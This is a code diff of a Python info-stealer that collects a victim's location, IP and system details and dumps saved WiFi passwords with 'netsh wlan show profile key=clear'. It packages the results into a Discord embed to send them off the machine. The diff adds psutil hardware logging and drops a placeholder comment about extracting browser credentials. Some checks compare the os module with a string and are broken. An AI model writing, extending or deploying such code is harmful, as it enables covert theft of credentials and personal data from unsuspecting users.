@@ -1,9 +1,9 @@
 import requests
 import os
-import re
 import sys
 import datetime
 import platform
+import psutil
 import socket
 import netifaces
 import subprocess
@@ -16,6 +16,7 @@ location_log = True
 general_log = True
 self_destruct = False
 retry_request =  False
+hardware_info = True
 
 #FINISHED
 #log location and other info
@@ -44,6 +45,34 @@ if location_log == True:
     [-] Google - {googlemap}""")
 else:
     location_info = ("Location info us turned OFF")
+
+#WIP
+#hardware logging
+if os != "nt":
+    hardware_log = ("Running linux, unable to get the info")
+    pass
+else:
+    if hardware_info == True:
+        cpufreq = psutil.cpu_freq()
+        svmem = psutil.virtual_memory()
+        partitions = psutil.disk_partitions()
+        disk_io = psutil.disk_io_counters()
+        net_io = psutil.net_io_counters()
+
+        hardware_log = (f"""
+    
+        [-] Cpu Frequenci - {cpufreq}
+
+        [-] Vram - {svmem} 
+
+        [-] Partitions - {partitions}
+
+        [-] Disks - {disk_io}
+
+        [-] Net IO - {net_io}""")
+    else:
+        hardware_log = ("Hardware Info is turned OFF") 
+
 
 #FINISHED, maybe add more stuff later
 #general info
@@ -96,19 +125,15 @@ if ip_log == True:
 else:
     ip_info = ("IP info is turned OFF")
 
-#extract browser creds
-#finish later
-
 #extracting wifi passwords
 #FINISHED just debug
 if os != ("nt"):
-    b = ('Unable to get wifi')
+    b = ('Running linux, unable to get the info')
     pass
 else: 
-    if os == ("nt"):
-        data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
-        profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
-        for i in profiles:
+    data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
+    profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]
+    for i in profiles:
             results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8').split('\n')
             results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
 
@@ -133,6 +158,14 @@ data_to_discord["embeds"] = [
                             'value': f'''
 
                             {general_info}
+                            
+                            '''
+                        },
+                        {
+                            'name': 'Hardware informations ',
+                            'value': f'''
+
+                            {hardware_log}
                             
                             '''
                         },
